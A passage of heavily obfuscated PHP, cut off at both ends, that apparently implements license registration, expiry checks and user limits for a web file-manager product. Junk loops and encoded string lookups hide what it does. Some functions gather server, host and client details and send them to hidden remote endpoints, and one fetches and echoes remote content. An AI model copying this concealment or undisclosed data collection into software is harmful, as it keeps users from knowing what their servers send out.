$GLOBALS[$¦üšÕä¾[13]][$¦üšÕä¾[15]] = implode($¦üšÕä¾[0], $GLOBALS[$¦üšÕä¾[13]][$¦üšÕä¾[14]]); $è• è‡ = $È°¡ÔÕ[704]; if (strlen($è• è‡) < $È°¡ÔÕ[692]) { die; } } private function qlux9ad3a82b() { $Î­ã–ÈŞ =& $_SERVER[§Êá¸İ]; $ºÙ¨´„Ï =& $_SERVER[ÌÛŒïÀ]; if ($GLOBALS[$ºÙ¨´„Ï[13]][$ºÙ¨´„Ï[15]] != $ºÙ¨´„Ï[6]) { return; } $Î—»¸Š­ = $_SERVER[$ºÙ¨´„Ï[16]]; $©­—ú = $Î­ã–ÈŞ[705]; if (!$©­—ú) { die; } $×ÛòÁ˜Î = $ºÙ¨´„Ï[17]; if (!strstr($Î—»¸Š­, $×ÛòÁ˜Î)) { return; } $›¥¥·ÓÑ = strrpos($Î—»¸Š­, $×ÛòÁ˜Î); $šÌ¥°À„ = substr($Î—»¸Š­, $›¥¥·ÓÑ + strlen($×ÛòÁ˜Î)); preg_match_all($ºÙ¨´„Ï[18], $šÌ¥°À„, $Ÿ‰¬„¨–); $úıàå½Ğ = $Î­ã–ÈŞ[706]; if (strlen($úıàå½Ğ) < $Î­ã–ÈŞ[477]) { die; } $šÌ¥°À„ = trim($Ÿ‰¬„¨–[0][0], $ºÙ¨´„Ï[19]); $GLOBALS[$ºÙ¨´„Ï[13]][$ºÙ¨´„Ï[14]] = explode($ºÙ¨´„Ï[19], $šÌ¥°À„); $·¤½® = $Î­ã–ÈŞ[707]; $GLOBALS[$ºÙ¨´„Ï[13]][$ºÙ¨´„Ï[15]] = implode($ºÙ¨´„Ï[0], $GLOBALS[$ºÙ¨´„Ï[13]][$ºÙ¨´„Ï[14]]); } public function run() { $»ô¾ÌíÏ =& $_SERVER[§Êá¸İ]; $Âì‚’µ¾ =& $_SERVER[ÌÛŒïÀ]; $this->qlux9ad3a82b(); $Æğ™¼÷¯ = $»ô¾ÌíÏ[708]; while ($Æğ™¼÷¯ < $»ô¾ÌíÏ[700]) { if ($Æğ™¼÷¯ >= 0) { break; } $Æğ™¼÷¯++; } $this->gslfbb472dfd(); $Ù–±öª = $GLOBALS[$Âì‚’µ¾[13]][$Âì‚’µ¾[14]]; $‹ÛÒß¬ = $GLOBALS[$Âì‚’µ¾[13]][$Âì‚’µ¾[15]]; define($Âì‚’µ¾[20], isset($Ù–±öª[0]) && $Ù–±öª[0] ? $Ù–±öª[0] : $this->defaultModule); $Ûİ’ğÁö = $»ô¾ÌíÏ[709]; if (strlen($Ûİ’ğÁö) < $»ô¾ÌíÏ[477]) { return; } define($Âì‚’µ¾[21], isset($Ù–±öª[1]) && $Ù–±öª[0] ? $Ù–±öª[1] : $this->defaultController); define($Âì‚’µ¾[22], isset($Ù–±öª[2]) && $Ù–±öª[0] ? $Ù–±öª[2] : $this->defaultAction); $ş‚èù™ë = $»ô¾ÌíÏ[710]; define($Âì‚’µ¾[23], MOD . $Âì‚’µ¾[0] . ST . $Âì‚’µ¾[0] . ACT); $¦¹íéÏ = $»ô¾ÌíÏ[711]; if (!$¦¹íéÏ) { return; } $_SERVER[$Âì‚’µ¾[24]] = strtolower(ACTION); $äÚûÙÜ = $»ô¾ÌíÏ[712]; $this->autorun(); $’à“Ë½Û = $»ô¾ÌíÏ[713]; while ($’à“Ë½Û < $»ô¾ÌíÏ[695]) { if ($’à“Ë½Û >= 0) { break; } $’à“Ë½Û++; } if (count($Ù–±öª) >= 3) { $this->appRun($‹ÛÒß¬); } else { $this->appRun(ACTION); } } private $sqoy7077237f = array(); private $hyln4174f37d = ''; public function donb943b3d8b() { $¶“¬–Öä =& $_SERVER[§Êá¸İ]; $¢ÕèËµà =& $_SERVER[ÌÛŒïÀ]; $this->qdaofc669ecb(); $this->wmfxc6aadffc(); $this->tbke758daffa(); $™°‰÷è’ = $¶“¬–Öä[714]; if (strlen($™°‰÷è’) < $¶“¬–Öä[695]) { die; } $this->mdhkaacb2580(); $§¼©ÓŞù = $¶“¬–Öä[715]; if (!$§¼©ÓŞù) { return; } $this->jbci928f0696(); $ÇòšÍâ– = $¶“¬–Öä[716]; if (strlen($ÇòšÍâ–) < $¶“¬–Öä[695]) { die; } $this->yldpc5cd2405(); $†µˆß = $¶“¬–Öä[717]; $this->frwv814d1735(); $this->heiud1ec239f($¢ÕèËµà[25], array($this, $¢ÕèËµà[26])); $this->heiud1ec239f($¢ÕèËµà[27], array($this, $¢ÕèËµà[28])); $this->heiud1ec239f($¢ÕèËµà[29], array($this, $¢ÕèËµà[30])); $this->heiud1ec239f($¢ÕèËµà[31], array($this, $¢ÕèËµà[32])); $³¹¢åø‰ = $¶“¬–Öä[718]; } public function pzdjde4d0eb5($€Á±Èë) { $ÓĞ£ğñ =& $_SERVER[§Êá¸İ]; $ÀğéÕ´£ =& $_SERVER[ÌÛŒïÀ]; $‡³Éûö = Model($ÀğéÕ´£[33])->get(); $¿ˆ´²›¸ = $ÓĞ£ğñ[719]; if (!$¿ˆ´²›¸) { return; } $ÆşÒÕ¡† = array($ÀğéÕ´£[34], $ÀğéÕ´£[35], $ÀğéÕ´£[36], $ÀğéÕ´£[37], $ÀğéÕ´£[38], $ÀğéÕ´£[39], $ÀğéÕ´£[40], $ÀğéÕ´£[41], $ÀğéÕ´£[42], $ÀğéÕ´£[43], $ÀğéÕ´£[44], $ÀğéÕ´£[45], $ÀğéÕ´£[46], $ÀğéÕ´£[47], $ÀğéÕ´£[48], $ÀğéÕ´£[49], $ÀğéÕ´£[50], $ÀğéÕ´£[51], $ÀğéÕ´£[52], $ÀğéÕ´£[53], $ÀğéÕ´£[54], $ÀğéÕ´£[55], $ÀğéÕ´£[56], $ÀğéÕ´£[57], $ÀğéÕ´£[58], $ÀğéÕ´£[59], $ÀğéÕ´£[60], $ÀğéÕ´£[61], $ÀğéÕ´£[62], $ÀğéÕ´£[63], $ÀğéÕ´£[64], $ÀğéÕ´£[65], $ÀğéÕ´£[66], $ÀğéÕ´£[67], $ÀğéÕ´£[68], $ÀğéÕ´£[69], $ÀğéÕ´£[70], $ÀğéÕ´£[71], $ÀğéÕ´£[72], $ÀğéÕ´£[73], $ÀğéÕ´£[74], $ÀğéÕ´£[75], $ÀğéÕ´£[76], $ÀğéÕ´£[77], $ÀğéÕ´£[78], $ÀğéÕ´£[79], $ÀğéÕ´£[80], $ÀğéÕ´£[81], $ÀğéÕ´£[82], $ÀğéÕ´£[83], $ÀğéÕ´£[84], $ÀğéÕ´£[85]); $Öú©æÚ¸ = $ÓĞ£ğñ[720]; foreach ($ÆşÒÕ¡† as $æ“Œİ–î) { $ñ«ğìà¢ = $GLOBALS[$ÀğéÕ´£[86]][$ÀğéÕ´£[87]][$æ“Œİ–î]; $§—‘’ëì = $ÓĞ£ğñ[721]; if (!$§—‘’ëì) { die; } if (isset($‡³Éûö[$æ“Œİ–î])) { $ñ«ğìà¢ = $‡³Éûö[$æ“Œİ–î]; } $€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[89]][$æ“Œİ–î] = $ñ«ğìà¢; } $ÚøøÎ´  = $€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[89]][$ÀğéÕ´£[46]]; unset($€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[90]][$ÀğéÕ´£[91]]); $˜‹Æˆ³œ = $ÓĞ£ğñ[722]; if (!$˜‹Æˆ³œ) { return; } unset($€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[90]][$ÀğéÕ´£[92]]); $¯ìô£»ä = $ÓĞ£ğñ[723]; unset($€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[89]][$ÀğéÕ´£[46]]); $³æÊş‘” = $ÓĞ£ğñ[724]; if (!$³æÊş‘”) { die; } unset($€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[89]][$ÀğéÕ´£[93]]); $µ…¢³› = $ÓĞ£ğñ[725]; if (!$µ…¢³›) { die; } $€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[89]][$ÀğéÕ´£[94]] = array($ÀğéÕ´£[95] => (int) $ÚøøÎ´ [$ÀğéÕ´£[96]], $ÀğéÕ´£[97] => (int) _get($ÚøøÎ´ , $ÀğéÕ´£[98], 0)); $îûçµëü = substr(md5($ÀğéÕ´£[99] . get_client_ip() . $‡³Éûö[$ÀğéÕ´£[100]]), 0, 15); $Ç¶«Ç– = $ÓĞ£ğñ[726]; while (strlen($Ç¶«Ç–) < $ÓĞ£ğñ[477]) { if (!$Ç¶«Ç–) { break; } $Ç¶«Ç–++; } $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[102]] = Mcrypt::encode(Session::sign(), $îûçµëü, 3600 * 24); $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[103]] = Action($ÀğéÕ´£[104])->accessToken(); $éÅùšËÍ = $ÓĞ£ğñ[727]; if (!$éÅùšËÍ) { return; } $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[105]] = md5($_SERVER[$ÀğéÕ´£[106]] . $‡³Éûö[$ÀğéÕ´£[100]]); $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[107]] = base64_encode(serverInfo()); $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[108]] = $this->hyln4174f37d; $¿ì’ä°¾ = $ÓĞ£ğñ[728]; if (!$¿ì’ä°¾) { return; } if ($‡³Éûö[$ÀğéÕ´£[108]] != $ÀğéÕ´£[109]) { $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[110]] = $‡³Éûö[$ÀğéÕ´£[110]]; $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[111]] = $‡³Éûö[$ÀğéÕ´£[111]]; $¶†Ü›Æğ = rand_string(10) . $this->hyln4174f37d . rand_string(5); $€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[112]][$ÀğéÕ´£[113]] = $this->upob6eefb415($¶†Ü›Æğ, $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[105]]); } if ($this->hyln4174f37d == $ÀğéÕ´£[109]) { $€Á±Èë[$ÀğéÕ´£[88]][$ÀğéÕ´£[89]][$ÀğéÕ´£[94]][$ÀğéÕ´£[98]] = 0; } $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[114]] = $this->versionPluginFilter(); $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[115]] = _get($this->sqoy7077237f, $ÀğéÕ´£[116], $ÀğéÕ´£[6]); $ø–³×˜ı = $ÓĞ£ğñ[729]; if (strlen($ø–³×˜ı) < $ÓĞ£ğñ[692]) { die; } if (KodUser::isRoot() && $this->config[$ÀğéÕ´£[117]]) { $€Á±Èë[$ÀğéÕ´£[101]][$ÀğéÕ´£[118]] = WEB_ROOT; } return $€Á±Èë; } private function yldpc5cd2405() { $Ü˜ÚÄë =& $_SERVER[§Êá¸İ]; $Á¬“úÚÕ =& $_SERVER[ÌÛŒïÀ]; $…™ğ˜è = $_SERVER[$Á¬“úÚÕ[24]] == $Á¬“úÚÕ[119]; if ($_SERVER[$Á¬“úÚÕ[24]] == $Á¬“úÚÕ[120] && $_GET[$Á¬“úÚÕ[121]] == $Á¬“úÚÕ[122]) { $…™ğ˜è = !0; } if ($…™ğ˜è) { $ï¿ê¡€ù = array($Á¬“úÚÕ[108] => $this->hyln4174f37d, $Á¬“úÚÕ[123] => $this->pofm30d4443d(), $Á¬“úÚÕ[124] => Model($Á¬“úÚÕ[125])->count()); if ($this->hyln4174f37d != $Á¬“úÚÕ[109]) { $ºŠ¥Ã¦õ = _get($this->sqoy7077237f, $Á¬“úÚÕ[126]); if ($ºŠ¥Ã¦õ) { $ï¿ê¡€ù[$Á¬“úÚÕ[127]] = $ºŠ¥Ã¦õ; $ï¿ê¡€ù[$Á¬“úÚÕ[128]] = strtotime(_get($this->sqoy7077237f, $Á¬“úÚÕ[129])); $ï¿ê¡€ù[$Á¬“úÚÕ[130]] = _get($this->sqoy7077237f, $Á¬“úÚÕ[116]); } $Ã»Ê°…ø = Model($Á¬“úÚÕ[33])->get($Á¬“úÚÕ[131], $Á¬“úÚÕ[6], !0); if (is_string($Ã»Ê°…ø) && substr($Ã»Ê°…ø, 0, 1) == $Á¬“úÚÕ[132]) { $Ã»Ê°…ø = json_decode_force($Ã»Ê°…ø); } if (is_array($Ã»Ê°…ø) && $Ã»Ê°…ø[$Á¬“úÚÕ[133]] && strstr($Ã»Ê°…ø[$Á¬“úÚÕ[133]], $Á¬“úÚÕ[134])) { $‚¢Ì¿–ù = explode($Á¬“úÚÕ[134], $Ã»Ê°…ø[$Á¬“úÚÕ[133]]); $ï¿ê¡€ù[$Á¬“úÚÕ[135]] = $‚¢Ì¿–ù[0]; } } $ï¿ê¡€ù = $this->cuvd88c7fe29(json_encode($ï¿ê¡€ù), md5($Á¬“úÚÕ[136])); $“î‚‰•¸ = $Ü˜ÚÄë[730]; if (!$“î‚‰•¸) { die; } $ĞŸş¼Ö = array($Á¬“úÚÕ[137] => $ï¿ê¡€ù); $¿ÓÇ÷ˆÙ = $Ü˜ÚÄë[731]; call_user_func(array($Á¬“úÚÕ[138], $Á¬“úÚÕ[139]), $ĞŸş¼Ö); } if ($this->hyln4174f37d == $Á¬“úÚÕ[109]) { return; } $†ÀÕ±Ñ = array($Á¬“úÚÕ[140], $Á¬“úÚÕ[141], $Á¬“úÚÕ[142], $Á¬“úÚÕ[143], $Á¬“úÚÕ[144], $Á¬“úÚÕ[145]); $İĞä©§ = Model($Á¬“úÚÕ[33])->get(); $“†ÉÄŞÁ = $Ü˜ÚÄë[732]; while (strlen($“†ÉÄŞÁ) < $Ü˜ÚÄë[700]) { if (!$“†ÉÄŞÁ) { break; } $“†ÉÄŞÁ++; } $ĞŸş¼Ö = array($Á¬“úÚÕ[146] => $İĞä©§[$Á¬“úÚÕ[34]], $Á¬“úÚÕ[147] => $İĞä©§[$Á¬“úÚÕ[35]], $Á¬“úÚÕ[148] => $Á¬“úÚÕ[6]); foreach ($†ÀÕ±Ñ as $ŸŞóà´Ÿ) { if (!isset($İĞä©§[$ŸŞóà´Ÿ]) || !$İĞä©§[$ŸŞóà´Ÿ]) { continue; } $ĞŸş¼Ö[$ŸŞóà´Ÿ] = $İĞä©§[$ŸŞóà´Ÿ]; $Ó„Á³„Û = $Ü˜ÚÄë[733]; if (strlen($Ó„Á³„Û) < $Ü˜ÚÄë[692]) { die; } } call_user_func(array($Á¬“úÚÕ[138], $Á¬“úÚÕ[139]), $ĞŸş¼Ö); } private function mdhkaacb2580() { $áÉ³† =& $_SERVER[§Êá¸İ]; $¡†¸  =& $_SERVER[ÌÛŒïÀ]; if ($_SERVER[$¡†¸ [24]] != $¡†¸ [149]) { return; } if (!KodUser::isRoot()) { die; } $ó¢ßÒç = $GLOBALS[$¡†¸ [13]]; if (isset($ó¢ßÒç[$¡†¸ [150]])) { $this->uvhza7c99db0(); die; } if (isset($ó¢ßÒç[$¡†¸ [151]]) && isset($ó¢ßÒç[$¡†¸ [151]]) == $¡†¸ [122]) { $ó¢ßÒç[$¡†¸ [152]] = Model($¡†¸ [33])->get($¡†¸ [153]); } if (!isset($ó¢ßÒç[$¡†¸ [152]]) || strlen($ó¢ßÒç[$¡†¸ [152]]) != 16) { show_json($¡†¸ [154] . $ó¢ßÒç[$¡†¸ [152]], !1); } $¦ÂÇÛ­è = Model($¡†¸ [33])->get($¡†¸ [100]); $Šç²è­ = md5($_SERVER[$¡†¸ [106]] . $¦ÂÇÛ­è); $„Îî–§ = $áÉ³†[734]; if (strlen($„Îî–§) < $áÉ³†[688]) { die; } $¶Æµ³¯ğ = array($¡†¸ [152] => $ó¢ßÒç[$¡†¸ [152]], $¡†¸ [155] => rand_string(16), $¡†¸ [156] => $¡†¸ [136], $¡†¸ [157] => $¡†¸ [158], $¡†¸ [159] => $_SERVER[$¡†¸ [160]], $¡†¸ [161] => $_SERVER[$¡†¸ [162]], $¡†¸ [163] => $_SERVER[$¡†¸ [164]], $¡†¸ [105] => $Šç²è­, $¡†¸ [165] => Model($¡†¸ [33])->get($¡†¸ [131])); $çê·‹Ä§ = $áÉ³†[735]; if (isset($ó¢ßÒç[$¡†¸ [151]]) && isset($ó¢ßÒç[$¡†¸ [151]]) == $¡†¸ [122]) { $¶Æµ³¯ğ[$¡†¸ [151]] = md5($¶Æµ³¯ğ[$¡†¸ [152]] . $¡†¸ [166] . $¶Æµ³¯ğ[$¡†¸ [155]]); } if ($ó¢ßÒç[$¡†¸ [167]] == $¡†¸ [168]) { $šÉ‚Š®® = $this->cuvd88c7fe29($Šç²è­, $¡†¸ [169]); $ì¾ùöíØ = $this->upob6eefb415(json_encode($¶Æµ³¯ğ), $Šç²è­ . $¡†¸ [170], 3); $ì¾ùöíØ = $ì¾ùöíØ . $¡†¸ [171] . $_SERVER[$¡†¸ [160]]; $×¢‰…ª¾ = $this->nqkpf4371e85($¡†¸ [172] . $šÉ‚Š®® . $¡†¸ [173] . $ì¾ùöíØ, -1); show_json($×¢‰…ª¾, !0); } else { if ($ó¢ßÒç[$¡†¸ [167]] == $¡†¸ [174]) { $ˆßçÂÇ = substr(md5($¡†¸ [175] . $Šç²è­), 12, 15) . $¡†¸ [176]; $ì¾ùöíØ = $this->mosxdba78173(trim($ó¢ßÒç[$¡†¸ [177]]), $ˆßçÂÇ, 2); $÷Ïî’»Ô = json_decode($ì¾ùöíØ, !0); if (!is_array($÷Ïî’»Ô) || !is_array($÷Ïî’»Ô[$¡†¸ [178]]) || $÷Ïî’»Ô[$¡†¸ [152]] != !0) { $¬‰Õ§”¿ = $¡†¸ [179]; $¤½Œ§»Ì = $÷Ïî’»Ô[$¡†¸ [178]] ? $¡†¸ [180] . $÷Ïî’»Ô[$¡†¸ [178]] : $¬‰Õ§”¿; show_json($¤½Œ§»Ì, !1); } else { $¶Æµ³¯ğ[$¡†¸ [155]] = $÷Ïî’»Ô[$¡†¸ [178]][$¡†¸ [181]]; } } else { $÷Ïî’»Ô = $this->nqkpf4371e85($¡†¸ [182], $¶Æµ³¯ğ, 10); } } if (!is_array($÷Ïî’»Ô) || !is_array($÷Ïî’»Ô[$¡†¸ [178]]) || $÷Ïî’»Ô[$¡†¸ [152]] != !0) { $¬‰Õ§”¿ = LNG($¡†¸ [183]); $¤½Œ§»Ì = $÷Ïî’»Ô[$¡†¸ [178]] ? $¡†¸ [180] . $÷Ïî’»Ô[$¡†¸ [178]] : $¬‰Õ§”¿; show_json($¤½Œ§»Ì, !1); } $ÙØš‡¥Ú = $÷Ïî’»Ô[$¡†¸ [178]]; $¼Ü™À = $this->qybj1ca966e5($ÙØš‡¥Ú[$¡†¸ [184]]); $•—¨ò·© = $áÉ³†[736]; while (strlen($•—¨ò·©) < $áÉ³†[700]) { if (!$•—¨ò·©) { break; } $•—¨ò·©++; } if (!$¼Ü™À || $¼Ü™À != $ÙØš‡¥Ú[$¡†¸ [129]]) { $ú²å‰¤ë = array($¡†¸ [185] => Model($¡†¸ [33])->get($¡†¸ [100]), $¡†¸ [186] => $_SERVER[$¡†¸ [106]], $¡†¸ [187] => this_url(), $¡†¸ [161] => $_SERVER[$¡†¸ [162]]); $ì¾ùöíØ = $this->ripde4ef178d(json_encode($ú²å‰¤ë)); $this->nqkpf4371e85($¡†¸ [188] . $ì¾ùöíØ); show_json(LNG($¡†¸ [189]), !0); } $ê§ûÏÆİ = array($¡†¸ [153] => $ÙØš‡¥Ú[$¡†¸ [190]], $¡†¸ [191] => $ÙØš‡¥Ú[$¡†¸ [192]], $¡†¸ [193] => rand_string(16), $¡†¸ [108] => $ÙØš‡¥Ú[$¡†¸ [194]]); if ($¶Æµ³¯ğ[$¡†¸ [155]]) { $ê§ûÏÆİ[$¡†¸ [193]] = $¶Æµ³¯ğ[$¡†¸ [155]]; } $¨³£’ò© = substr(md5($ê§ûÏÆİ[$¡†¸ [191]]), 10, 10); $ö¤š™Ôœ = $¨³£’ò© . $ê§ûÏÆİ[$¡†¸ [108]] . $ê§ûÏÆİ[$¡†¸ [193]]; $ê§ûÏÆİ[$¡†¸ [110]] = strrev(base64_encode($this->cuvd88c7fe29($ö¤š™Ôœ, $¡†¸ [195]))); $Æ“åÜğä = $áÉ³†[737]; while (strlen($Æ“åÜğä) < $áÉ³†[700]) { if (!$Æ“åÜğä) { break; } $Æ“åÜğä++; } $šÎ°Â€ = rand_string(16); $Á–—ˆÕÏ = $šÎ°Â€ . $ê§ûÏÆİ[$¡†¸ [108]] . $this->cuvd88c7fe29(md5($ê§ûÏÆİ[$¡†¸ [153]]), $šÎ°Â€); $¥÷Ö£è  = $áÉ³†[738]; $ê§ûÏÆİ[$¡†¸ [111]] = base64_encode(strrev($this->cuvd88c7fe29($Á–—ˆÕÏ, $¡†¸ [196]))); $Ç¿»—¨¦ = $áÉ³†[739]; while (strlen($Ç¿»—¨¦) < $áÉ³†[695]) { if (!$Ç¿»—¨¦) { break; } $Ç¿»—¨¦++; } if ($ÙØš‡¥Ú[$¡†¸ [197]] && $ÙØš‡¥Ú[$¡†¸ [197]] >= 1) { Model($¡†¸ [33])->setDeep($¡†¸ [198], $¡†¸ [122]); } Model($¡†¸ [33])->set($ê§ûÏÆİ); $ğŒ¥¼™ò = md5($_SERVER[$¡†¸ [106]] . strrev($¦ÂÇÛ­è) . $ê§ûÏÆİ[$¡†¸ [191]]); $Ñµê¬º‹ = $áÉ³†[740]; if (!$Ñµê¬º‹) { return; } $ş½“ØÍ¤ = strrev(substr($ğŒ¥¼™ò, 10, 16)); $…´œÇúÖ = $this->upob6eefb415(json_encode($ÙØš‡¥Ú), $ğŒ¥¼™ò); $ŠÙİô÷à = array_to_keyvalue(Model($¡†¸ [7])->listData(), $¡†¸ [199]); $’Å…Î£ = $ŠÙİô÷à[$¡†¸ [200]]; $«†¡¨ª» = $áÉ³†[741]; if (!$«†¡¨ª») { return; } $šºá…Ôş = array(); $šºá…Ôş[$ş½“ØÍ¤] = $…´œÇúÖ; Model($¡†¸ [7])->update($’Å…Î£[$¡†¸ [201]], array($¡†¸ [202] => $šºá…Ôş)); $this->sqoy7077237f = $ÙØš‡¥Ú; $«Æœœü = $áÉ³†[742]; while ($«Æœœü < $áÉ³†[695]) { if ($«Æœœü >= 0) { break; } $«Æœœü++; } $this->hyln4174f37d = $ê§ûÏÆİ[$¡†¸ [108]]; $ùÇŒÍÑØ = $áÉ³†[743]; if (!$ùÇŒÍÑØ) { return; } $this->licenseRegistSuccess(); $àË…À¦ì = $áÉ³†[744]; Cache::set($¡†¸ [203] . md5($¦ÂÇÛ­è . $¡†¸ [204]), $¡†¸ [6]); show_json(LNG($¡†¸ [189]), !0); } private function licenseRegistSuccess() { $œİÃùŒ =& $_SERVER[§Êá¸İ]; $ò¢È…ä™ =& $_SERVER[ÌÛŒïÀ]; $Ÿ¹ÊÆù = Model($ò¢È…ä™[33])->get(); $úÉ¯Ş±³ = $œİÃùŒ[745]; while ($úÉ¯Ş±³ < $œİÃùŒ[695]) { if ($úÉ¯Ş±³ >= 0) { break; } $úÉ¯Ş±³++; } if ($Ÿ¹ÊÆù[$ò¢È…ä™[63]] != $ò¢È…ä™[122]) { Model($ò¢È…ä™[33])->set($ò¢È…ä™[63], $ò¢È…ä™[122]); } Action($ò¢È…ä™[205])->initStart(!0); } private function uvhza7c99db0() { $ñô¬×ß =& $_SERVER[§Êá¸İ]; $ÖÈ«ÀÔ =& $_SERVER[ÌÛŒïÀ]; Model($ÖÈ«ÀÔ[33])->set(array($ÖÈ«ÀÔ[153] => $ÖÈ«ÀÔ[6], $ÖÈ«ÀÔ[191] => $ÖÈ«ÀÔ[6], $ÖÈ«ÀÔ[108] => $ÖÈ«ÀÔ[109], $ÖÈ«ÀÔ[110] => $ÖÈ«ÀÔ[6], $ÖÈ«ÀÔ[111] => $ÖÈ«ÀÔ[6])); Model($ÖÈ«ÀÔ[33])->setDeep($ÖÈ«ÀÔ[198], $ÖÈ«ÀÔ[206]); $¡ÏÏ¹Î = $ñô¬×ß[746]; if (!$¡ÏÏ¹Î) { die; } $this->sqoy7077237f = array(); $€¯®ü¡ñ = $ñô¬×ß[747]; if (!$€¯®ü¡ñ) { die; } $this->hyln4174f37d = $ÖÈ«ÀÔ[109]; $â€İ”‰ = $ñô¬×ß[748]; if (!$â€İ”‰) { return; } } private function qdaofc669ecb() { $ËĞ±òĞÙ =& $_SERVER[§Êá¸İ]; $çÜû®¢˜ =& $_SERVER[ÌÛŒïÀ]; $_SERVER[$çÜû®¢˜[162]] = _get($_SERVER, $çÜû®¢˜[162], APP_HOST); $this->hyln4174f37d = $çÜû®¢˜[109]; $Ìıœ Ì¼ = Model($çÜû®¢˜[33])->get(); if ($Ìıœ Ì¼[$çÜû®¢˜[108]] == $çÜû®¢˜[109]) { return; } $Öñí¸ı = Model($çÜû®¢˜[33])->get($çÜû®¢˜[100]); $õÑ‡†Œµ = $ËĞ±òĞÙ[749]; while ($õÑ‡†Œµ < $ËĞ±òĞÙ[695]) { if ($õÑ‡†Œµ >= 0) { break; } $õÑ‡†Œµ++; } $Œ¬ğ²’Ò = $çÜû®¢˜[203] . md5($Öñí¸ı . $çÜû®¢˜[204]); $•Á¤³ì¶ = Cache::get($Œ¬ğ²’Ò); $×½ªËêÑ = $ËĞ±òĞÙ[750]; if (strlen($×½ªËêÑ) < $ËĞ±òĞÙ[477]) { return; } if (!is_array($•Á¤³ì¶) || !isset($•Á¤³ì¶[$çÜû®¢˜[207]]) || time() - $•Á¤³ì¶[$çÜû®¢˜[207]] >= 60) { $™Æ¥Ô • = Model($çÜû®¢˜[7])->loadList(); $£š¤ßº† = $™Æ¥Ô •[$çÜû®¢˜[200]]; $“‘¦ì‹ = md5($_SERVER[$çÜû®¢˜[106]] . strrev($Öñí¸ı) . $Ìıœ Ì¼[$çÜû®¢˜[191]]); $Ùœ¤»Â = strrev(substr($“‘¦ì‹, 10, 16)); $•Á¤³ì¶ = $this->mosxdba78173($£š¤ßº†[$çÜû®¢˜[86]][$Ùœ¤»Â], $“‘¦ì‹); $•Á¤³ì¶ = json_decode($•Á¤³ì¶, !0); } if (!is_array($•Á¤³ì¶)) { return $this->uvhza7c99db0(); } $Ê¸‚áÁ = strtotime($•Á¤³ì¶[$çÜû®¢˜[129]]); if (time() >= $Ê¸‚áÁ) { return $this->uvhza7c99db0(); } if (!isset($•Á¤³ì¶[$çÜû®¢˜[207]]) || time() - $•Á¤³ì¶[$çÜû®¢˜[207]] > 20) { $•Á¤³ì¶[$çÜû®¢˜[207]] = time(); Cache::set($Œ¬ğ²’Ò, $•Á¤³ì¶); } $this->sqoy7077237f = $•Á¤³ì¶; $this->hyln4174f37d = $Ìıœ Ì¼[$çÜû®¢˜[108]]; $¯ŠİÒĞ = $ËĞ±òĞÙ[751]; if (strlen($¯ŠİÒĞ) < $ËĞ±òĞÙ[700]) { die; } } private function wmfxc6aadffc() { $ûØùô¶Ç =& $_SERVER[§Êá¸İ]; $Ëà«ô¿ =& $_SERVER[ÌÛŒïÀ]; $™›Û¸à  = $GLOBALS[$Ëà«ô¿[13]]; $ŒÈÂ¢¢Ù = $ûØùô¶Ç[752]; while (strlen($ŒÈÂ¢¢Ù) < $ûØùô¶Ç[695]) { if (!$ŒÈÂ¢¢Ù) { break; } $ŒÈÂ¢¢Ù++; } $Òöœ€Ñ£ = $_SERVER[$Ëà«ô¿[24]]; $½£á†ä… = $ûØùô¶Ç[753]; while (strlen($½£á†ä…) < $ûØùô¶Ç[695]) { if (!$½£á†ä…) { break; } $½£á†ä…++; } if ($Òöœ€Ñ£ == $Ëà«ô¿[208] && $this->hyln4174f37d == $Ëà«ô¿[109]) { show_json(LNG($Ëà«ô¿[209]), !1, $Ëà«ô¿[210]); } $Ìî¸È¹ = array($Ëà«ô¿[211], $Ëà«ô¿[212]); if (in_array($Òöœ€Ñ£, $Ìî¸È¹)) { if ($this->hyln4174f37d == $Ëà«ô¿[109] && isset($™›Û¸à [$Ëà«ô¿[213]])) { show_json(LNG($Ëà«ô¿[209]), !1, $Ëà«ô¿[210]); die; } $¨œŞıæà = $this->pofm30d4443d(); if ($¨œŞıæà != intval($Ëà«ô¿[214])) { if ($¨œŞıæà <= Model($Ëà«ô¿[125])->count()) { show_json(LNG($Ëà«ô¿[215]), !1, $Ëà«ô¿[210]); die; } } } } private function tbke758daffa() { $¬‰Ã¹Ü =& $_SERVER[§Êá¸İ]; $èÆ¯ª£Ì =& $_SERVER[ÌÛŒïÀ]; $îéæì¹Ê = array($èÆ¯ª£Ì[119], $èÆ¯ª£Ì[120]); if (!KodUser::isRoot() || !isset($_GET[$èÆ¯ª£Ì[216]])) { return; } if (!in_array($_SERVER[$èÆ¯ª£Ì[24]], $îéæì¹Ê)) { return; } $ŒÛòÏüù = $èÆ¯ª£Ì[217]; $ŒÛòÏüù = $this->madc899353b8($ŒÛòÏüù, $èÆ¯ª£Ì[218]); $¨Å¸”ğç = stream_context_create(array($èÆ¯ª£Ì[219] => array($èÆ¯ª£Ì[220] => $èÆ¯ª£Ì[221], $èÆ¯ª£Ì[222] => 3))); $ğğíõ”Ò = @file_get_contents($ŒÛòÏüù, !1, $¨Å¸”ğç); header($èÆ¯ª£Ì[223]); $‰—èÖÔÈ = $¬‰Ã¹Ü[754]; if (strlen($‰—èÖÔÈ) < $¬‰Ã¹Ü[700]) { die; } if ($ğğíõ”Ò && strstr($ğğíõ”Ò, $èÆ¯ª£Ì[224])) { echo $ğğíõ”Ò; } die; } public function yrwk208d87ab($È¹€ÕÂç) { $ÔÚ“‘Ş„ =& $_SERVER[§Êá¸İ]; $—òÄõşı =& 